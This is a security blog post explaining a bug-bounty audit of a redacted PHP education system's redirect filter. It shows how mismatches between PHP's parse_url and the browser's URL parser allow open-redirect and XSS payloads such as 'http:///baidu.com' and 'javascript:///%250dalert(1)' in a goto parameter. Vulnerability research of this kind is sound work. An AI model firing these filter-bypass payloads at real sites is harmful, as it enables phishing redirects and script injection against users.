<!doctype html>















































<html
  class="not-ready lg:text-base"
  style="--bg: #faf8f1"
  lang="en"
  dir="ltr"
>
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, shrink-to-fit=no"
  />

  
  <title>A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard - Writeups</title>

  
  <meta name="theme-color" />

  
  
  
  
  <meta name="description" content="In August 2022, when digging the SRC of Tianrongxin, I found that redacted teaching and training system was used in a site of Tianrongxin Education, so I downloaded the source code of redacted on github and audited it.
Source &amp; Sink According to the audit, redacted Education and training system uses goto parameter in many places to achieve page redirection, such as login function:
http://demo.redacted.com/login?goto=/ If a logged-in user accesses this URL, the back-end reads the value of the goto parameter and fills it into the custom property data-goto of the div tag in the twig template:" />
  <meta name="author" content="rickshang" />
  

  
  
  
  
  
  
  <link rel="preload stylesheet" as="style" href="https://shangrui-hash.github.io/main.min.css" />

  
  
  
  
  
  <link rel="preload" as="image" href="https://shangrui-hash.github.io/theme.svg" />

  
  
  
  
  <link rel="preload" as="image" href="https://www.gravatar.com/avatar/f03f484e9c9aa609f8cbea12f98be54d?s=160&amp;d=identicon" />
  
  

  
  
  <link rel="preload" as="image" href="https://shangrui-hash.github.io/twitter.svg" />
  
  <link rel="preload" as="image" href="https://shangrui-hash.github.io/github.svg" />
  
  <link rel="preload" as="image" href="https://shangrui-hash.github.io/rss.svg" />
  
  

  
  

  
  
  

  
  <link
    rel="icon"
    href="https://shangrui-hash.github.io/favicon.ico"
  />
  <link
    rel="apple-touch-icon"
    href="https://shangrui-hash.github.io/apple-touch-icon.png"
  />

  
  <meta name="generator" content="Hugo 0.124.1">

  
  
  
</head>

  <body class="text-black duration-200 ease-out dark:text-white">
    <header class="mx-auto flex h-[4.5rem] max-w-[--w] px-8 lg:justify-center">
  <div class="relative z-50 ltr:mr-auto rtl:ml-auto flex items-center">
    <a class="-translate-y-[1px] text-2xl font-medium" href="https://shangrui-hash.github.io/"
      >Writeups</a
    >
    <div
      class="btn-dark text-[0] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.svg)_left_center/cover_no-repeat] dark:invert dark:[background-position:right]"
      role="button"
      aria-label="Dark"
    ></div>
  </div>

  <div
    class="btn-menu relative z-50 ltr:-mr-8 rtl:-ml-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
    role="button"
    aria-label="Menu"
  ></div>

  

  <script>
    
    const htmlClass = document.documentElement.classList;
    setTimeout(() => {
      htmlClass.remove('not-ready');
    }, 10);

    
    const btnMenu = document.querySelector('.btn-menu');
    btnMenu.addEventListener('click', () => {
      htmlClass.toggle('open');
    });

    
    const metaTheme = document.querySelector('meta[name="theme-color"]');
    const lightBg = '#faf8f1'.replace(/"/g, '');
    const setDark = (isDark) => {
      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
      htmlClass[isDark ? 'add' : 'remove']('dark');
      localStorage.setItem('dark', isDark);
    };

    
    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
    if (htmlClass.contains('dark')) {
      setDark(true);
    } else {
      const darkVal = localStorage.getItem('dark');
      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
    }

    
    darkScheme.addEventListener('change', (event) => {
      setDark(event.matches);
    });

    
    const btnDark = document.querySelector('.btn-dark');
    btnDark.addEventListener('click', () => {
      setDark(localStorage.getItem('dark') !== 'true');
    });
  </script>

  <div
    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
  >
    
    
    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse">
      
      <a
        class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal"
        href="/"
        >Home</a
      >
      
      <a
        class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal"
        href="/en/posts"
        >Posts</a
      >
      
      <a
        class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal"
        href="/en/about"
        >Whoami</a
      >
      
    </nav>
    

    
    <nav
      class="mt-12 flex justify-center space-x-10 rtl:space-x-reverse dark:invert ltr:lg:ml-14 rtl:lg:mr-14 lg:mt-0 lg:items-center"
    >
      
      <a
        class="h-7 w-7 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./twitter.svg)"
        href="https://twitter.com/RuiShang9"
        target="_blank"
        rel="me"
      >
        twitter
      </a>
      
      <a
        class="h-7 w-7 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./github.svg)"
        href="https://github.com/ShangRui-hash"
        target="_blank"
        rel="me"
      >
        github
      </a>
      
      <a
        class="h-7 w-7 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./rss.svg)"
        href="https://shangrui-hash.github.io/index.xml"
        target="_blank"
        rel="alternate"
      >
        rss
      </a>
      
    </nav>
    
  </div>
</header>


    <main
      class="prose prose-neutral relative mx-auto min-h-[calc(100vh-9rem)] max-w-[--w] px-8 pb-16 pt-14 dark:prose-invert"
    >
      

<article>
  <header class="mb-14">
    <h1 class="!my-0 pb-2.5">A Research Of The Inconsistency Between WHATWG URL standard And RFC URL standard</h1>

    
    <div class="text-xs antialiased opacity-60">
      
      <time>Mar 17, 2023</time>
      
      
      
      
    </div>
    
  </header>

  <section><p>In August 2022, when digging the <a href="https://src.topsec.com.cn/">SRC of Tianrongxin</a>, I found that <a href="https://github.com/redacted/redacted">redacted</a> teaching and training system was used in a site of Tianrongxin Education, so I downloaded the source code of redacted on github and audited it.</p>
<h2 id="source--sink">Source &amp; Sink</h2>
<p>According to the audit, redacted Education and training system uses goto parameter in many places to achieve page redirection, such as login function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://demo.redacted.com/login?goto=/
</span></span></code></pre></div><p>If a logged-in user accesses this URL, the back-end reads the value of the <code>goto</code> parameter and fills it into the custom property <code>data-goto</code> of the div tag in the twig template:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>{% block content %}
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page-message-container&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page-message-container&#34;</span> <span style="color:#a6e22e">data-goto</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{ goto }}&#34;</span> <span style="color:#a6e22e">data-duration</span><span style="color:#f92672">=</span><span style="color:#e6db74">{{</span> <span style="color:#a6e22e">duration</span> <span style="color:#960050;background-color:#1e0010">}}</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page-message-panel&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page-message-heading&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h2</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page-message-title&#34;</span>&gt;{{ title|trans }}&lt;/<span style="color:#f92672">h2</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page-message-body&#34;</span>&gt;{{ message|default(&#39;&#39;)|trans|raw }}&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>{% endblock %}
</span></span></code></pre></div><p>Then, the front-end reads the value of <code>data-goto</code> property through the following js code, and jumps to the page through <code>window.location.href</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">e</span>, <span style="color:#a6e22e">t</span>) {
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#page-message-container&#34;</span>),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">data</span>(<span style="color:#e6db74">&#34;goto&#34;</span>),
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">o</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">data</span>(<span style="color:#e6db74">&#34;duration&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">o</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">setTimeout</span>((<span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">r</span>
</span></span><span style="display:flex;"><span>}), <span style="color:#a6e22e">o</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="sanitizerfilter">Sanitizer/Filter</h2>
<p>In order to prevent the occurrence of open redirection vulnerability (OR) and XSS in the process of page redirection, redacted specially writes a <a href="https://github.com/redacted/redacted/blob/ffcb9cad8c6097d6d734ca3caf27e2e09dce9660/src/AppBundle/Controller/BaseController.php#L375-L388">filter</a> on the back end to filter the URL in the <code>goto</code> parameter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">/</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span> <span style="color:#a6e22e">Filter</span> <span style="color:#a6e22e">urls</span><span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span> <span style="color:#66d9ef">If</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">url</span> <span style="color:#a6e22e">does</span> <span style="color:#66d9ef">not</span> <span style="color:#a6e22e">belong</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">domain</span> <span style="color:#a6e22e">name</span> <span style="color:#a6e22e">other</span> <span style="color:#a6e22e">than</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">site</span>, <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">home</span> <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">of</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">site</span><span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">param</span> $url <span style="color:#a6e22e">string</span> $url <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">filtered</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span> <span style="color:#f92672">@</span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">string</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span> <span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">filterRedirectUrl</span>($url)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>$host <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;request_stack&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getCurrentRequest</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getHost</span>();
</span></span><span style="display:flex;"><span>$safeHosts <span style="color:#f92672">=</span> [$host];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$parsedUrl <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($url);
</span></span><span style="display:flex;"><span>$isUnsafeHost <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($parsedUrl[<span style="color:#e6db74">&#39;host&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">in_array</span>($parsedUrl[<span style="color:#e6db74">&#39;host&#39;</span>], $safeHosts);
</span></span><span style="display:flex;"><span>$isInvalidUrl <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($parsedUrl[<span style="color:#e6db74">&#39;scheme&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">in_array</span>($parsedUrl[<span style="color:#e6db74">&#39;scheme&#39;</span>], [<span style="color:#e6db74">&#39;http&#39;</span>, <span style="color:#e6db74">&#39;https&#39;</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($url) <span style="color:#f92672">||</span> $isUnsafeHost <span style="color:#f92672">||</span> $isInvalidUrl) {
</span></span><span style="display:flex;"><span>$url <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">generateUrl</span>(<span style="color:#e6db74">&#39;homepage&#39;</span>, [], <span style="color:#a6e22e">UrlGeneratorInterface</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ABSOLUTE_URL</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strip_tags</span>($url);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The filter works as follows:</p>
<ol>
<li>Obtain the Host header in the http request packet and use it as the host whitelist</li>
<li>Set protocol whitelists to http and https</li>
<li>Use PHP&rsquo;s URL parser to parse the incoming URL and get the host part and scheme part</li>
<li>If the host part and the scheme part exist, check whether the host part belongs to the host whitelist and the scheme part belongs to the scheme whitelist</li>
<li>Otherwise, it is assumed that the user passed in a relative URL</li>
</ol>
<h2 id="bypass-the-host-check">Bypass the host check</h2>
<p>How do I bypass filter&rsquo;s host check? The following payload comes to mind:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http://baidu.com\@demo.redacted.com/
</span></span></code></pre></div><p>The payload works because of the inconsistency between the front-end and back-end URL parsers:</p>
<ul>
<li><code>parse_url</code> of PHP considers the host part of the URL to be demo.redacted.com, which is the same as the Host request in the http request packet. Therefore, the check is passed.</li>
<li>But the javascript URL parser doesn&rsquo;t think so: the js URL parser normalizes \ to /, so the payload is normalized into the following URL:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://baidu.com/@demo.redacted.com/
</span></span></code></pre></div><p>Therefore, the front-end considers the host part of the URL to be baidu.com.</p>
<p>PHP URL parser:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#34;var_dump(parse_url(&#39;http://baidu.com\@demo.redacted.com/&#39;));&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Command</span> <span style="color:#a6e22e">line</span> <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">4</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;scheme&#39;</span> <span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">4</span>) <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;host&#39;</span> <span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">16</span>) <span style="color:#e6db74">&#34;demo.redacted.com&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">10</span>) <span style="color:#e6db74">&#34;baidu.com</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#39;path&#39; =&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  string(1) &#34;</span><span style="color:#f92672">/</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
</span></span></span></code></pre></div><p>Javascript URL parser:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#e6db74">&#39;http://baidu.com\\@demo.redacted.com/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">URL</span> {<span style="color:#a6e22e">origin</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;http://baidu.com&#39;</span>, <span style="color:#a6e22e">protocol</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;http:&#39;</span>, <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;, password: &#39;</span>, <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;baidu.com&#39;</span>,... }
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">hash</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;baidu.com&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">hostname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;baidu.com&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">href</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://baidu.com/@demo.redacted.com/&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">origin</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://baidu.com&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pathname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/@demo.redacted.com/&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">protocol</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http:&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">search</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">searchParams</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">URLSearchParams</span> {}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span></code></pre></div><p>A point of note when <code>\</code> is the js escape symbol, such as: hexadecimal encoding <code>\x61</code>, and control character encoding <code>\n</code>&hellip;</p>
<p>So it&rsquo;s escaped again in the demo code above</p>
<h2 id="bypass-scheme-check">Bypass scheme check</h2>
<p>By simply bypassing host checking, we can only create an open redirection vulnerability. To cause xss, we also need to bypass protocol checking on the back end. How do we bypass protocol checking on the back end?</p>
<p>We can try to start with the following idea: since vulnerability are often due to some false assumptions of the program, we can try to find out what false assumptions filter has, and then try to break it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$parsedUrl <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($url);
</span></span><span style="display:flex;"><span>$isUnsafeHost <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($parsedUrl[<span style="color:#e6db74">&#39;host&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">in_array</span>($parsedUrl[<span style="color:#e6db74">&#39;host&#39;</span>], $safeHosts);
</span></span><span style="display:flex;"><span>$isInvalidUrl <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($parsedUrl[<span style="color:#e6db74">&#39;scheme&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">in_array</span>($parsedUrl[<span style="color:#e6db74">&#39;scheme&#39;</span>], [<span style="color:#e6db74">&#39;http&#39;</span>, <span style="color:#e6db74">&#39;https&#39;</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($url) <span style="color:#f92672">||</span> $isUnsafeHost <span style="color:#f92672">||</span> $isInvalidUrl) {
</span></span><span style="display:flex;"><span>    $url <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">generateUrl</span>(<span style="color:#e6db74">&#39;homepage&#39;</span>, [], <span style="color:#a6e22e">UrlGeneratorInterface</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ABSOLUTE_URL</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strip_tags</span>($url);
</span></span></code></pre></div><p>Looking back at the filter code above, filter assumes:</p>
<ol>
<li>If the host and scheme parts cannot be resolved from the URL, it must be a relative URL</li>
<li><code>Relative URL</code> must be secure.</li>
</ol>
<p>So what happens if we make parse_url return <code>false</code>?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">false</span>[<span style="color:#e6db74">&#39;host&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#66d9ef">NULL</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">false</span>[<span style="color:#e6db74">&#39;scheme&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#66d9ef">NULL</span>
</span></span></code></pre></div><p><code>parse_url</code> will assume that the URL passed in by the user has no host and scheme parts, so it&rsquo;s a relative URL! Relative urls must be safe and can be returned directly to the front end.</p>
<p>How do we make <code>parse_url</code> return <code>false</code>?</p>
<p>The PHP URL parser is just an implementation of the RFC standard, so if the URL passed in does not conform to the RFC specification, then the <code>parse_url</code> will return false</p>
<p>A classic payload, for example, is a much simpler way to cause open redirects:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:///baidu.com
</span></span></code></pre></div><p><a href="https://www.rfc-editor.org/rfc/rfc1738">RFC 1738</a> states that the absolute URL of the hierarchy must exclude the protocol part and subsequent parts must begin with //</p>
<blockquote>
<p>The scheme specific data start with a double slash &ldquo;//&rdquo; to indicate that it complies with the common Internet scheme syntax.</p>
</blockquote>
<p>So PHP&rsquo;s URL parser thinks that <code>http:///baidu.com</code> is an illegal URL, so it simply returns <code>false</code>, bypassing the follow-up check and returning it to the front end.</p>
<p>But the front-end URL parser doesn&rsquo;t think so, and normalizes <code>http:///baidu.com</code> to <code>http://baidu.com</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#e6db74">&#39;http:///baidu.com&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">URL</span> {<span style="color:#a6e22e">origin</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;http://baidu.com&#39;</span>, <span style="color:#a6e22e">protocol</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;http:&#39;</span>, <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;, password: &#39;</span>, <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;baidu.com&#39;</span>,... }
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">hash</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;baidu.com&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">hostname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;baidu.com&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">href</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://baidu.com/&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">origin</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://baidu.com&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pathname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">protocol</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http:&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">search</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">searchParams</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">URLSearchParams</span> {}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span></code></pre></div><p>So there is an OR vulnerability.</p>
<p>What about swapping <code>http</code> for <code>javascript</code>? The RFC document only specifies that hierarchical urls must contain the &lsquo;//&rsquo; prefix, but does not specify what should the URL parser do if a non-hierarchical URL contains a &lsquo;//&rsquo; prefix</p>
<p>for example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>javascript:alert(1) ---&gt; javascript://alert(1)
</span></span><span style="display:flex;"><span>mailto:happyhacking@qq.com ---&gt; mailto://happyhacking@qq.com
</span></span></code></pre></div><p>So I thought of payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://demo.redacted.com/login?goto=javascript:///%250dalert(1)
</span></span></code></pre></div><p>PHP&rsquo;s URL parser considers <code>javascript:///%250dalert(1)</code> to be an illegal URL and returns <code>false</code>, so filter skips protocol checking and simply considers it to be a safe <code>relative URL</code>.</p>
